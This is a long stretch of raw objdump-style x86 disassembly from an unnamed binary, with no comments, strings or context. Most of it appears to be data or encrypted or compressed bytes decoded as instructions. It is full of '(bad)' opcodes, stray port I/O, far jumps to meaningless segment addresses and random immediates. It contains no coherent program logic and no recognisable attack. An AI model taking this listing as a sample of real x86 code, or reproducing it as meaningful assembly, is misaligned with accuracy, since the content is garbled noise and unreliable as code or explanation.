  424db4:	sbb    DWORD PTR [ebx-0x7a],ebx
  424db7:	xor    ah,BYTE PTR [ebx]
  424db9:	outs   dx,BYTE PTR ds:[esi]
  424dba:	in     al,0xf8
  424dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424dbd:	sub    dh,BYTE PTR [edi-0x1f773302]
  424dc3:	(bad)  
  424dc4:	jg     0x424db2
  424dc6:	mov    ah,0x9d
  424dc8:	fistp  DWORD PTR [ebx+0x2b]
  424dcb:	adc    BYTE PTR [eax+0x6d],ch
  424dce:	es call 0x797c:0x63ba06fb
  424dd6:	and    dl,bl
  424dd8:	or     eax,DWORD PTR [ebx+eax*2-0x673d3a73]
  424ddf:	outs   dx,BYTE PTR ds:[esi]
  424de0:	lds    esi,FWORD PTR [edi-0x16]
  424de3:	inc    esi
  424de4:	loop   0x424d75
  424de6:	lods   al,BYTE PTR ds:[esi]
  424de7:	xchg   ecx,eax
  424de8:	xchg   cl,dh
  424dea:	ds int 0x71
  424ded:	in     eax,dx
  424dee:	sub    al,BYTE PTR [esp+edx*1-0x5]
  424df2:	add    eax,0xde22abe1
  424df7:	push   0x54
  424df9:	clc    
  424dfa:	dec    ecx
  424dfb:	add    ebx,edx
  424dfd:	mov    edx,0x8f44cbb7
  424e02:	jb     0x424e10
  424e04:	xchg   DWORD PTR [ebx-0x1c71a201],ecx
  424e0a:	adc    eax,0x3ad21a19
  424e0f:	xor    ecx,DWORD PTR ds:0x73c7e2f
  424e15:	mov    edi,0x94fe7cfc
  424e1a:	test   ch,0xd8
  424e1d:	fild   QWORD PTR [ebp+0x75]
  424e20:	jmp    0x9a92:0x8b5a8eb5
  424e27:	leave  
  424e28:	mov    edx,0x1509ab5
  424e2d:	lahf   
  424e2e:	out    0x1f,eax
  424e30:	dec    edi
  424e31:	jb     0x424e69
  424e33:	xchg   BYTE PTR [ebx],dh
  424e35:	(bad)  
  424e36:	or     edx,DWORD PTR [ecx]
  424e38:	xor    ah,BYTE PTR [edi]
  424e3a:	test   BYTE PTR [edi-0x36],0x7d
  424e3e:	sbb    ecx,edx
  424e40:	daa    
  424e41:	xchg   edx,eax
  424e42:	movups xmm3,XMMWORD PTR [eax+0x5acab19a]
  424e49:	jmp    0x10f00ba7
  424e4e:	push   ecx
  424e4f:	stc    
  424e50:	rcl    DWORD PTR [edi-0x6f55989a],1
  424e56:	ins    BYTE PTR es:[edi],dx
  424e57:	pop    edx
  424e58:	(bad)  
  424e59:	cmc    
  424e5a:	aaa    
  424e5b:	sbb    BYTE PTR [ecx],dh
  424e5d:	mov    WORD PTR [ecx-0x35798ebb],fs
  424e63:	in     al,dx
  424e64:	jnp    0x424e58
  424e66:	sbb    DWORD PTR [ebx+ebx*1+0xa],ebx
  424e6a:	enter  0xea8,0xe6
  424e6e:	mov    ch,0x49
  424e70:	cmp    eax,0x9c3231d0
  424e75:	xor    eax,0x3fd7f77f
  424e7a:	or     esi,DWORD PTR [ebp+0xd]
  424e7d:	mov    ds:0x97575571,eax
  424e82:	arpl   WORD PTR [edx],bp
  424e84:	bound  esp,QWORD PTR [edi]
  424e86:	mov    esp,0x54e79733
  424e8b:	jbe    0x424e4c
  424e8d:	adc    eax,0xb64ca355
  424e92:	mov    ch,0x51
  424e94:	xchg   esp,eax
  424e95:	shl    DWORD PTR [esi-0x13f827fd],1
  424e9b:	in     eax,dx
  424e9c:	inc    esi
  424e9d:	pushf  
  424e9e:	test   eax,0x92bd65a8
  424ea3:	repz loop 0x424e4a
  424ea6:	mov    bh,0xfb
  424ea8:	jmp    0x8ae301d2
  424ead:	cdq    
  424eae:	xchg   esp,eax
  424eaf:	jno    0x424efd
  424eb1:	pop    es
  424eb2:	push   ebp
  424eb3:	and    esi,DWORD PTR [ebx]
  424eb5:	or     eax,0xf4004766
  424eba:	hlt    
  424ebb:	add    BYTE PTR [ebp+0x1b949022],0x5a
  424ec2:	int3   
  424ec3:	jns    0x424e81
  424ec5:	inc    ebx
  424ec6:	dec    eax
  424ec7:	dec    esi
  424ec8:	cs push ebp
  424eca:	repnz popa 
  424ecc:	mov    ebx,0xc13fc1d2
  424ed1:	(bad)  
  424ed2:	cmp    eax,0x9c580cb8
  424ed7:	test   BYTE PTR [eax-0x38],ch
  424eda:	test   BYTE PTR [ecx+0x56],al
  424edd:	jmp    0xae44:0xcb7f9d59
  424ee4:	stc    
  424ee5:	push   es
  424ee6:	(bad)  
  424ee7:	mov    ecx,0x50c07606
  424eec:	mov    al,0x72
  424eee:	mov    ch,0x4a
  424ef0:	xlat   BYTE PTR ds:[ebx]
  424ef1:	mov    ds:0xdeb02472,eax
  424ef6:	cwde   
  424ef7:	std    
  424ef8:	aaa    
  424ef9:	ss clc 
  424efb:	adc    eax,0x4f67efd6
  424f00:	int3   
  424f01:	xchg   DWORD PTR [edx-0x653dae3a],esi
  424f07:	das    
  424f08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f09:	cs inc eax
  424f0b:	fild   QWORD PTR [esi+eax*4+0x60da4c65]
  424f12:	pop    edx
  424f13:	retf   0x81d9
  424f16:	aad    0x9f
  424f18:	popf   
  424f19:	mov    edi,0x76b927f7
  424f1e:	adc    esp,ebx
  424f20:	(bad)  
  424f21:	mov    cl,al
  424f23:	sub    dl,BYTE PTR [edx]
  424f25:	ins    BYTE PTR es:[edi],dx
  424f26:	jg     0x424f03
  424f28:	mov    ebx,0xa6dad9f2
  424f2d:	add    bl,BYTE PTR [eax+0x3c]
  424f30:	mov    dh,0xda
  424f32:	mov    ds:0x2eb09904,al
  424f37:	pushf  
  424f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f39:	xor    esi,DWORD PTR [edi+ecx*2-0x7cafa6ba]
  424f40:	imul   edx,DWORD PTR [edi-0x10],0x5e
  424f44:	shl    DWORD PTR [eax+0x6c7be29f],1
  424f4a:	shl    dh,cl
  424f4c:	test   DWORD PTR [edx+0x38],edx
  424f4f:	jnp    0x424eff
  424f51:	sbb    BYTE PTR [edx+0x6e],0x9
  424f55:	cli    
  424f56:	push   ebx
  424f57:	fscale 
  424f59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f5a:	in     eax,0x93
  424f5c:	sub    ebp,DWORD PTR [edx]
  424f5e:	in     al,dx
  424f5f:	mov    ds:0x49a45f7d,eax
  424f64:	add    cl,BYTE PTR [ebp+0x56]
  424f67:	test   eax,0xc77bfe38
  424f6c:	ds lock xor eax,0xf7edbd17
  424f73:	fs or  al,0x4b
  424f76:	xchg   esp,eax
  424f77:	jnp    0x424f7c
  424f79:	add    DWORD PTR [ecx+0x22],esi
  424f7c:	dec    ecx
  424f7d:	repnz fdiv QWORD PTR [eax]
  424f80:	or     al,0xa4
  424f82:	int3   
  424f83:	jecxz  0x424fb1
  424f85:	retf   
  424f86:	inc    edi
  424f87:	in     eax,0x9f
  424f89:	loope  0x424fd5
  424f8b:	mov    ch,0x6b
  424f8d:	sbb    BYTE PTR [esi-0x160e8f38],bl
  424f93:	test   eax,0x22a003ab
  424f98:	mov    ebp,0xc3cd88fc
  424f9d:	push   ebx
  424f9e:	ror    DWORD PTR [esi+eax*2-0xf21576d],0x6d
  424fa6:	ins    DWORD PTR es:[edi],dx
  424fa7:	mov    WORD PTR [ecx+0x2aa941ab],?
  424fad:	cli    
  424fae:	out    dx,al
  424faf:	popf   
  424fb0:	sbb    DWORD PTR [edx+ebp*4],edi
  424fb3:	inc    DWORD PTR [ebx]
  424fb5:	imul   esp,DWORD PTR [eax],0x2d549d3d
  424fbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424fbc:	pop    esp
  424fbd:	or     eax,0x6281e346
  424fc2:	in     eax,0x96
  424fc4:	sahf   
  424fc5:	adc    eax,DWORD PTR [edi+esi*1-0x139f9d5e]
  424fcc:	pop    ebx
  424fcd:	mov    edi,0xa964b23e
  424fd2:	push   es
  424fd3:	dec    ebp
  424fd4:	dec    ecx
  424fd5:	pop    edi
  424fd6:	dec    esp
  424fd7:	aas    
  424fd8:	inc    ebp
  424fd9:	mov    al,ds:0xa0cf0af4
  424fde:	pop    es
  424fdf:	arpl   WORD PTR [esi],dx
  424fe1:	xchg   ecx,eax
  424fe2:	inc    ecx
  424fe3:	in     al,0x57
  424fe5:	xchg   esp,eax
  424fe6:	stos   WORD PTR es:[edi],ax
  424fe8:	aaa    
  424fe9:	and    DWORD PTR [ebx+eax*4-0x4dc7c6d7],0xf4946891
  424ff4:	and    BYTE PTR [esi+0x3da035a3],bl
  424ffa:	jp     0x424fe8
  424ffc:	lahf   
  424ffd:	push   cs
  424ffe:	xor    eax,0x654e1ce0
  425003:	fild   QWORD PTR [esi+0x4fc77386]
  425009:	jmp    FWORD PTR [edi-0xf]
  42500c:	loope  0x425018
  42500e:	push   eax
  42500f:	push   0x67
  425011:	inc    ebx
  425012:	mov    al,0xc2
  425014:	cmp    dh,bh
  425016:	scas   al,BYTE PTR es:[edi]
  425017:	xchg   edx,eax
  425018:	push   es
  425019:	or     eax,0x17b7a81
  42501e:	dec    edi
  42501f:	nop
  425020:	mov    al,ds:0x10088e1a
  425025:	push   es
  425026:	int3   
  425027:	test   eax,0xb55ee7be
  42502c:	pushf  
  42502d:	sbb    DWORD PTR [ebx-0x6d],edx
  425030:	jmp    0x8c692e3b
  425035:	ja     0x425099
  425037:	mov    cl,0x9a
  425039:	pop    ss
  42503a:	xchg   bh,ch
  42503c:	dec    eax
  42503d:	addr16 std 
  42503f:	mov    bl,0x71
  425041:	(bad)  
  425042:	repnz sar DWORD PTR [ecx+0x51],cl
  425046:	pop    ss
  425047:	inc    esi
  425048:	sahf   
  425049:	cmc    
  42504a:	loop   0x42503d
  42504c:	test   al,0xf7
  42504e:	xchg   esi,eax
  42504f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425050:	out    0xc4,eax
  425052:	mov    dh,0xd4
  425054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425055:	cld    
  425056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425057:	and    eax,0xf48f1cc4
  42505c:	jmp    0x7073341c
  425061:	cli    
  425062:	xchg   edx,eax
  425063:	aad    0x15
  425065:	push   esp
  425066:	xchg   ebp,eax
  425067:	mov    BYTE PTR [esi],0xef
  42506a:	jne    0x425043
  42506c:	mov    ds:0x77098528,al
  425071:	idiv   BYTE PTR [esi+0xb]
  425074:	pusha  
  425075:	popf   
  425076:	pop    es
  425077:	mov    ch,0xb6
  425079:	sar    BYTE PTR [esi+0x44],cl
  42507c:	int3   
  42507d:	fst    DWORD PTR [esp+edx*2-0x211ebc7b]
  425084:	xchg   DWORD PTR [eax-0x51],ebp
  425087:	cs retf 
  425089:	cmp    cl,BYTE PTR [ecx-0x41]
  42508c:	adc    DWORD PTR [ecx],eax
  42508e:	inc    eax
  42508f:	push   ebx
  425090:	lds    ebx,FWORD PTR [ebx]
  425092:	in     eax,0x41
  425094:	xor    DWORD PTR [ebp-0x511748ef],esp
  42509a:	sbb    eax,0x94adadc6
  42509f:	xor    al,0x1
  4250a1:	jecxz  0x425040
  4250a3:	pop    ss
  4250a4:	or     BYTE PTR [esi-0x76],al
  4250a7:	ins    BYTE PTR es:[edi],dx
  4250a8:	fdivr  QWORD PTR [eax-0x614b92e6]
  4250ae:	pop    eax
  4250af:	xor    DWORD PTR [edx],esi
  4250b1:	jp     0x4250db
  4250b3:	push   eax
  4250b4:	mov    ch,0x88
  4250b6:	ret    
  4250b7:	cmp    DWORD PTR [ecx+ebp*4],eax
  4250ba:	mov    WORD PTR [edx-0x2f],fs
  4250bd:	push   eax
  4250be:	test   BYTE PTR [ebx],dl
  4250c0:	or     ebx,DWORD PTR [ecx+esi*8]
  4250c3:	cmp    eax,0xbeec228f
  4250c8:	mov    ebp,DWORD PTR ds:0x51274648
  4250ce:	and    bl,BYTE PTR [esi-0x52]
  4250d1:	aas    
  4250d2:	sbb    BYTE PTR [edi-0x32930bcb],ch
  4250d8:	into   
  4250d9:	sub    edx,DWORD PTR [eax]
  4250db:	jbe    0x4250ad
  4250dd:	fnsave [esi-0x7626300b]
  4250e3:	stc    
  4250e4:	mov    edx,0xf20dbff2
  4250e9:	mov    ebp,0xc8b5fd3e
  4250ee:	je     0x42511a
  4250f0:	mov    al,0xd6
  4250f2:	adc    ecx,DWORD PTR [esi+0x77]
  4250f5:	cmp    BYTE PTR [ecx+0x5b918f1f],ah
  4250fb:	or     esi,DWORD PTR [ebx]
  4250fd:	out    dx,al
  4250fe:	add    al,0x0
	...
  425108:	add    BYTE PTR [eax],al
  42510a:	pop    ecx
  42510b:	push   ebp
  42510c:	push   esp
  42510d:	push   edx
  42510e:	pop    esp
  42510f:	push   ebx
  425110:	pop    edi
  425111:	pop    edi
  425112:	xchg   ebx,eax
  425113:	stos   DWORD PTR es:[edi],eax
  425114:	mov    ebx,0x1fd2e496
  425119:	jns    0x4250be
  42511b:	fiadd  WORD PTR [ecx]
  42511d:	add    BYTE PTR [ebp+0x6],bh
  425120:	add    BYTE PTR [eax],al
  425122:	aaa    
  425123:	test   al,0x9e
  425125:	aaa    
  425126:	jns    0x4250d1
  425128:	call   DWORD PTR [ebx]
  42512a:	sub    al,0xfe
  42512c:	mov    eax,ds
  42512e:	dec    BYTE PTR [edi+0x1e]
  425131:	push   es
  425132:	push   ds
  425133:	jmp    0x42517c
  425135:	nop
  425136:	or     DWORD PTR [ebx+0x40],edi
  425139:	inc    ebx
  42513a:	sbb    eax,0x333c8994
  42513f:	add    esp,DWORD PTR [ebp-0x5819b9ea]
  425145:	mov    edx,0x5641c83c
  42514a:	jae    0x4251a3
  42514c:	mov    ah,0xfd
  42514e:	(bad)  
  42514f:	cs pushf 
  425151:	sbb    DWORD PTR [esi+ebx*8-0x66b73c7b],0xa131d5f5
  42515c:	xchg   esi,eax
  42515d:	mov    edx,0xf2eebef4
  425162:	push   cs
  425163:	fsubrp st(6),st
  425165:	(bad)  
  425166:	je     0x4251ce
  425168:	or     esp,esp
  42516a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42516b:	jmp    0x42513a
  42516d:	sbb    eax,0xe090b3c3
  425172:	and    al,0x98
  425174:	in     eax,0xce
  425176:	push   ss
  425177:	stos   DWORD PTR es:[edi],eax
  425178:	ret    
  425179:	or     al,0x2f
  42517b:	pop    ebp
  42517c:	dec    eax
  42517d:	mov    ch,0x97
  42517f:	pushf  
  425180:	xchg   ebx,eax
  425181:	or     BYTE PTR [ecx+0x4942b45b],bh
  425187:	and    BYTE PTR [esi],bh
  425189:	xchg   esp,eax
  42518a:	dec    edx
  42518b:	fsub   DWORD PTR [eax+0x21ebb226]
  425191:	mov    edx,0x97c965f1
  425196:	into   
  425197:	push   cs
  425198:	jg     0x425216
  42519a:	cli    
  42519b:	fisubr WORD PTR [ebx]
  42519d:	hlt    
  42519e:	es mov ecx,0xaf9b0365
  4251a4:	fstp   TBYTE PTR [ecx+0x56]
  4251a7:	addr16 js 0x42520b
  4251aa:	mov    eax,ds:0xb120afdc
  4251af:	cmp    BYTE PTR [edx-0x3e718025],0x9f
  4251b6:	and    eax,0x47ed4db6
  4251bb:	repz add bh,BYTE PTR [ebx]
  4251be:	mov    ch,0x8e
  4251c0:	out    0x62,al
  4251c2:	xor    eax,ecx
  4251c4:	cwde   
  4251c5:	test   BYTE PTR [esi],bh
  4251c7:	scas   eax,DWORD PTR es:[edi]
  4251c8:	in     eax,dx
  4251c9:	adc    al,0xb1
  4251cb:	sbb    DWORD PTR [ebx],ebp
  4251cd:	pop    ss
  4251ce:	pop    edi
  4251cf:	jnp    0x42521a
  4251d1:	mov    cl,0x14
  4251d3:	mov    edi,0x7e4c599a
  4251d8:	fiadd  WORD PTR [esp+eiz*8]
  4251db:	jae    0x425197
  4251dd:	mov    edi,0x2fc93614
  4251e2:	xchg   BYTE PTR [ecx-0x2fdd9df3],ah
  4251e8:	mov    al,ds:0x67909dc2
  4251ed:	xor    al,0x63
  4251ef:	shr    DWORD PTR [esi-0x44],0xa3
  4251f3:	hlt    
  4251f4:	out    0x7e,al
  4251f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251f7:	not    BYTE PTR [edx+0xc6e5bc7]
  4251fd:	jge    0x42525e
  4251ff:	pop    ebp
  425200:	adc    DWORD PTR [edx+0x45],esp
  425203:	ins    BYTE PTR es:[edi],dx
  425204:	push   eax
  425205:	aas    
  425206:	sub    dh,BYTE PTR [eax+ebx*8]
  425209:	test   eax,0x42198614
  42520e:	sbb    al,0xa8
  425210:	xor    ah,dl
  425212:	sti    
  425213:	lahf   
  425214:	dec    ebp
  425215:	(bad)  
  425216:	stc    
  425217:	lds    edi,FWORD PTR [esi]
  425219:	popa   
  42521a:	jmp    FWORD PTR [ecx-0x1d]
  42521d:	sti    
  42521e:	sub    esi,DWORD PTR [edi+ecx*8-0x242280b5]
  425225:	cmp    ebx,esi
  425227:	fisub  WORD PTR [ebx+0xa46d9c5]
  42522d:	lahf   
  42522e:	fadd   DWORD PTR [esi-0x1e262537]
  425234:	imul   esp,edx,0xffffffaf
  425237:	and    edx,DWORD PTR [edx-0x66aea423]
  42523d:	in     al,dx
  42523e:	jo     0x425238
  425240:	pop    esi
  425241:	xchg   edx,eax
  425242:	sbb    al,0xba
  425244:	xor    al,0xf6
  425246:	push   esi
  425247:	mov    esp,0xfbd18c4
  42524c:	add    DWORD PTR [esi+ebp*8+0x36978ba7],0xab72108f
  425257:	mov    edi,0xd12dc132
  42525c:	push   ds
  42525d:	out    dx,eax
  42525e:	or     bl,cl
  425260:	hlt    
  425261:	mov    ch,0x2a
  425263:	mov    dh,0x96
  425265:	call   0x2a28:0xf8263435
  42526c:	and    al,0xe
  42526e:	jge    0x4252d5
  425270:	or     al,0x1c
  425272:	jge    0x4252b0
  425274:	mov    eax,0xfa6534ca
  425279:	and    al,BYTE PTR [ebp+0x3962b609]
  42527f:	xor    BYTE PTR [ebx+0x10],0x9
  425283:	add    al,0x97
  425285:	cmp    eax,0x1f1d248e
  42528a:	jbe    0x42528b
  42528c:	aaa    
  42528d:	xchg   DWORD PTR [edi-0x6b],esi
  425290:	cmp    al,0x7d
  425292:	jno    0x42528a
  425294:	mov    edx,0x2be358fb
  425299:	es ss or al,0x8d
  42529d:	pop    es
  42529e:	rcl    BYTE PTR [ebx+eiz*1],cl
  4252a1:	ret    
  4252a2:	dec    edx
  4252a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252a4:	lods   al,BYTE PTR ds:[esi]
  4252a5:	inc    ebp
  4252a6:	js     0x4252fc
  4252a8:	ror    BYTE PTR [ebp+ecx*8-0x49],1
  4252ac:	mov    cl,0x67
  4252ae:	mov    dh,0x76
  4252b0:	int3   
  4252b1:	arpl   WORD PTR [ebp-0x6bcc3046],bp
  4252b7:	mov    dl,0x44
  4252b9:	mov    eax,0xebe42db3
  4252be:	fs retf 0xa1d3
  4252c2:	sub    dh,BYTE PTR [eax]
  4252c4:	enter  0x17b9,0x3
  4252c8:	sti    
  4252c9:	sbb    al,0x1b
  4252cb:	and    bl,BYTE PTR ds:0x5c35ada6
  4252d1:	daa    
  4252d2:	push   0xffffffa4
  4252d4:	add    al,0xf3
  4252d6:	or     esp,esp
  4252d8:	pop    edi
  4252d9:	add    eax,0x23d496dd
  4252de:	aaa    
  4252df:	pop    edi
  4252e0:	cmp    ch,BYTE PTR [edi+eiz*1]
  4252e3:	sbb    BYTE PTR [ecx+0x10a7ea2f],al
  4252e9:	push   ss
  4252ea:	add    ah,BYTE PTR [ecx+0x16]
  4252ed:	aas    
  4252ee:	inc    ebx
  4252ef:	push   esp
  4252f0:	aad    0xca
  4252f2:	pop    ebx
  4252f3:	es mov ebx,0xba9842f7
  4252f9:	pop    ds
  4252fa:	ret    
  4252fb:	pop    edx
  4252fc:	sub    eax,0xbeb4b74b
  425301:	cmp    DWORD PTR [edx*4+0x739fe7b5],esp
  425308:	cmp    bh,BYTE PTR [edx]
  42530a:	add    ah,BYTE PTR [ecx]
  42530c:	or     DWORD PTR [ebp+0x26],ecx
  42530f:	call   0xded5:0xf1ccf4b8
  425316:	xchg   edi,eax
  425317:	call   0xc62c3a5c
  42531c:	pusha  
  42531d:	add    eax,0xf06ed817
  425322:	gs repz xchg ecx,eax
  425325:	(bad)  
  425326:	push   eax
  425327:	mov    edx,0x11f93c9f
  42532c:	mov    eax,0xc365c37a
  425331:	mov    dh,0x3d
  425333:	(bad)  
  425334:	int    0xa9
  425336:	mov    eax,ds:0x60bd0579
  42533b:	mov    esi,0x4f03e4bb
  425340:	add    al,0xd4
  425342:	mov    ebp,esi
  425344:	jnp    0x42531a
  425346:	push   es
  425347:	repz xor eax,DWORD PTR [edx+esi*2]
  42534b:	dec    edx
  42534c:	cmp    DWORD PTR [eax],edi
  42534e:	pop    ebx
  42534f:	or     eax,0x52647bbd
  425354:	mov    BYTE PTR [edx-0x67],ch
  425357:	jbe    0x425385
  425359:	jb     0x42530f
  42535b:	or     cl,BYTE PTR [edx-0x41c0571a]
  425361:	mov    al,0x93
  425363:	pop    edx
  425364:	dec    ecx
  425365:	(bad)  
  425366:	cmp    bh,dl
  425368:	xchg   edx,eax
  425369:	mov    ch,0x70
  42536b:	fist   DWORD PTR ds:0xa87f30e9
  425371:	jg     0x42531d
  425373:	xor    ebp,eax
  425375:	sbb    edi,DWORD PTR [ecx]
  425377:	int    0x69
  425379:	jae    0x425375
  42537b:	pop    ds
  42537c:	jns    0x425364
  42537e:	push   DWORD PTR [ebx-0x2c]
  425381:	dec    edx
  425382:	mov    cl,0xb0
  425384:	cmp    ch,ch
  425386:	inc    edx
  425387:	rol    edx,0x6c
  42538a:	dec    esi
  42538b:	mov    BYTE PTR [edi+eiz*4+0x28b9b30b],dl
  425392:	das    
  425393:	mov    bh,0xb6
  425395:	jmp    0x390017f8
  42539a:	inc    ebx
  42539b:	push   ebp
  42539c:	pop    ebx
  42539d:	aas    
  42539e:	add    ebx,DWORD PTR [ecx-0x4358b301]
  4253a4:	mov    cl,0xb7
  4253a6:	pop    ebp
  4253a7:	cmp    al,0x29
  4253a9:	int3   
  4253aa:	popa   
  4253ab:	mov    eax,ds:0x54ca3b12
  4253b0:	sub    al,0x1f
  4253b2:	shl    DWORD PTR [ebp-0x213101c],1
  4253b8:	scas   eax,DWORD PTR es:[edi]
  4253b9:	jnp    0x4253d0
  4253bb:	rcr    esp,1
  4253bd:	bnd jmp 0x4253d8
  4253c0:	retf   0xa4dc
  4253c3:	push   edx
  4253c4:	mov    edx,DWORD PTR [edx-0x69]
  4253c7:	cmp    DWORD PTR [ecx-0x255b9a01],edx
  4253cd:	loope  0x425429
  4253cf:	fst    DWORD PTR [ebx-0x1cde4e60]
  4253d5:	daa    
  4253d6:	cli    
  4253d7:	sub    DWORD PTR [edi],ebp
  4253d9:	shl    BYTE PTR [edi-0x4084699c],1
  4253df:	inc    eax
  4253e0:	dec    esi
  4253e1:	leave  
  4253e2:	sub    eax,DWORD PTR [ebp-0x82a1bda]
  4253e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253e9:	inc    eax
  4253ea:	lods   al,BYTE PTR ds:[esi]
  4253eb:	rol    DWORD PTR [edi+0x346165fb],0x60
  4253f2:	sbb    eax,0xd44f449d
  4253f7:	push   0x24e13776
  4253fc:	push   0xfffffff1
  4253fe:	std    
  4253ff:	xor    esp,DWORD PTR [eax+0x65]
  425402:	div    DWORD PTR [eax]
  425404:	pop    ebx
  425405:	test   DWORD PTR [edx+eiz*8],ecx
  425408:	les    esi,FWORD PTR [ebx-0x4576588a]
  42540e:	add    esi,esp
  425410:	ds sbb eax,0xf9925b29
  425416:	test   BYTE PTR [eax],0xf6
  425419:	(bad)  
  42541a:	sub    DWORD PTR [eax-0x62e7eb96],esp
  425420:	repnz aam 0x11
  425423:	sub    eax,0xeba9e4a0
  425428:	inc    ebp
  425429:	push   ebx
  42542a:	push   ecx
  42542b:	or     BYTE PTR [ecx-0x73],ah
  42542e:	test   al,0x7e
  425430:	add    eax,0x69d2e3a1
  425435:	test   al,dh
  425437:	mov    ecx,0xa3a26c9d
  42543c:	fsub   QWORD PTR [edx]
  42543e:	push   ebx
  42543f:	and    ch,BYTE PTR [edi-0x3a7c4ce7]
  425445:	cmp    esi,ecx
  425447:	cwde   
  425448:	or     al,0x13
  42544a:	fldenv [ecx]
  42544c:	fimul  DWORD PTR [eax-0x60947681]
  425452:	push   cs
  425453:	ret    
  425454:	arpl   sp,bp
  425456:	leave  
  425457:	inc    ecx
  425458:	xor    al,0x14
  42545a:	adc    DWORD PTR [esi+0x283cc80f],ecx
  425460:	jbe    0x42544f
  425462:	fimul  WORD PTR [ecx]
  425464:	pop    eax
  425465:	adc    eax,0x47587fd5
  42546a:	mov    esi,0xed477524
  42546f:	inc    ecx
  425470:	fsub   QWORD PTR [eax-0x1edbefdd]
  425476:	loopne 0x425498
  425478:	das    
  425479:	inc    eax
  42547a:	icebp  
  42547b:	pusha  
  42547c:	imul   edx,DWORD PTR [edx+eax*4+0x3c],0xb11ba3a5
  425484:	pop    edi
  425485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425486:	inc    eax
  425487:	mov    ecx,0x3f390b32
  42548c:	fcom   st(6)
  42548e:	mov    esi,0xd20f3a09
  425493:	cmp    esi,DWORD PTR [ebp-0x400d6dea]
  425499:	clc    
  42549a:	icebp  
  42549b:	jo     0x42548e
  42549d:	call   0xd9604277
  4254a2:	int    0xbc
  4254a4:	pusha  
  4254a5:	sbb    eax,0x932cf0d
  4254aa:	mov    ch,0xe4
  4254ac:	test   BYTE PTR ss:[ecx+eiz*4],0xcd
  4254b1:	aam    0xb
  4254b3:	daa    
  4254b4:	xor    eax,edx
  4254b6:	cli    
  4254b7:	mov    ds:0x24e1c7c9,al
  4254bc:	aad    0x2a
  4254be:	xor    eax,0xdc21fe9c
  4254c3:	mov    ah,0x38
  4254c5:	bnd call 0xc225fc0b
  4254cb:	push   0x751c75f8
  4254d0:	and    BYTE PTR [edx],0x64
  4254d3:	cmp    dl,BYTE PTR [ebx]
  4254d5:	mov    eax,0x396f7551
  4254da:	jae    0x425489
  4254dc:	jp     0x425535
  4254de:	push   cs
  4254df:	pop    es
  4254e0:	lods   eax,DWORD PTR fs:[esi]
  4254e2:	mov    DWORD PTR [ecx],0x7f95d8b0
  4254e8:	or     ebp,DWORD PTR [edi+0x20]
  4254eb:	data16 add ah,BYTE PTR [ebx]
  4254ee:	jle    0x42555b
  4254f0:	fcomp  DWORD PTR [ebx+0x10]
  4254f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254f4:	fdiv   QWORD PTR [esi+eax*8]
  4254f7:	push   0xffffff87
  4254f9:	mov    dl,0x64
  4254fb:	pop    es
  4254fc:	mov    dl,0xa7
  4254fe:	(bad)
  425503:	pop    es
  425504:	lock jmp 0x3e1b:0xc93d10de
  42550c:	push   edx
  42550d:	cmp    ecx,DWORD PTR [ecx+0x42b23cf]
  425513:	mov    al,ds:0x457fcc59
  425518:	popa   
  425519:	and    eax,0x3f56d493
  42551e:	ds add eax,0x6e0e7570
  425524:	xor    al,ah
  425526:	push   ebx
  425527:	bts    esp,esp
  42552a:	inc    ebx
  42552b:	loopne 0x4254f4
  42552d:	jne    0x425570
  42552f:	pusha  
  425530:	mov    eax,0x5e0158
  425535:	push   ecx
  425536:	pop    edi
  425537:	imul   edi,edi,0x3a
  42553a:	pop    esi
  42553b:	test   DWORD PTR [ebx+esi*8],esp
  42553e:	aam    0x78
  425540:	push   ebx
  425541:	std    
  425542:	aaa    
  425543:	hlt    
  425544:	cmp    al,0xbc
  425546:	dec    edx
  425547:	cld    
  425548:	arpl   bp,cx
  42554a:	dec    ebp
  42554b:	and    BYTE PTR [ebx-0x46],ch
  42554e:	adc    eax,0xede160c8
  425553:	sbb    ecx,eax
  425555:	cmp    edi,ebp
  425557:	xlat   BYTE PTR ds:[ebx]
  425558:	repz jle 0x4254ef
  42555b:	fcomip st,st(5)
  42555d:	lods   eax,DWORD PTR ds:[esi]
  42555e:	or     eax,0xb9743b6c
  425563:	add    al,0xdd
  425565:	add    al,0x6a
  425567:	test   al,0x9e
  425569:	ror    al,1
  42556b:	sbb    DWORD PTR [edi-0x211e6f1e],0xffffffd9
  425572:	test   al,0x5b
  425574:	push   edx
  425575:	jmp    0x4255e7
  425577:	xchg   esi,eax
  425578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425579:	add    DWORD PTR [ebp-0x65],esi
  42557c:	out    0x5e,eax
  42557e:	pusha  
  42557f:	loopne 0x42553c
  425581:	into   
  425582:	ret    0x9ef8
  425585:	inc    ecx
  425586:	repz sub ah,BYTE PTR [eax-0x62]
  42558a:	pusha  
  42558b:	mov    cl,0xa7
  42558d:	pop    edi
  42558e:	pop    ebx
  42558f:	fist   DWORD PTR [esi+0x5f5f388d]
  425595:	sbb    edi,DWORD PTR [esi-0x3897e61a]
  42559b:	ds mov ?,ebx
  42559e:	xchg   DWORD PTR [edx-0x5d6c438b],ebx
  4255a4:	sbb    al,0x4a
  4255a6:	clc    
  4255a7:	pop    esp
  4255a8:	cmp    edi,edx
  4255aa:	push   es
  4255ab:	or     DWORD PTR [ebx+0x78],0xfffffff4
  4255af:	mov    dl,0x28
  4255b1:	inc    edx
  4255b2:	scas   eax,DWORD PTR es:[edi]
  4255b3:	test   DWORD PTR [ebp+0x6820637a],esp
  4255b9:	shr    DWORD PTR [edi+0x7a75f8cd],1
  4255bf:	(bad)  
  4255c0:	ficom  WORD PTR [ebx+0x3f]
  4255c3:	mov    eax,ds:0xa8a7e50b
